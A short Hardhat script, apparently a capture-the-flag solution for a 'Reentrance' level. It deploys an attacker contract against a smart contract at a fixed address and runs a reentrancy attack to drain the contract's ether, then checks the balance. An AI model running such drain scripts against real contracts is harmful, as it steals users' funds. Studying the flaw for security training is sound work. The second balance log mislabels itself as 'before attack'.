import { ethers } from "hardhat";

const CONTRACT_NAME = "Reentrance";
const CONTRACT_ADDRESS = "0xbCDEf605bC20bcB112F0e59e161E0C9a6bA997F2";
const CONTRACT_ATTACKER_NAME = "AttackerContract";

async function hack() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  //deploy attacker contract
  const attackerFactory = await ethers.getContractFactory(
    CONTRACT_ATTACKER_NAME
  );
  const attackerContract = await attackerFactory.deploy(contract.address);

  //get balance
  let contractBalance = await ethers.provider.getBalance(CONTRACT_ADDRESS);
  console.log(
    `Contract balance before attack: ${ethers.utils.formatEther(
      contractBalance
    )} ETH`
  );

  const value = ethers.utils.parseEther("0.001");

  //make a donation in order to hack the contract
  const txDonation = await contract.donate(attackerContract.address, {
    value: value,
    gasLimit: 100000,
  });
  await txDonation.wait();

  const txAttacker = await attackerContract.attack({
    value: value,
    gasLimit: 100000,
  });
  await txAttacker.wait();

  //get balance after attack
  contractBalance = await ethers.provider.getBalance(CONTRACT_ADDRESS);
  console.log(
    `Contract balance before attack: ${ethers.utils.formatEther(
      contractBalance
    )} ETH`
  );

  if (contractBalance.toNumber() === 0) console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
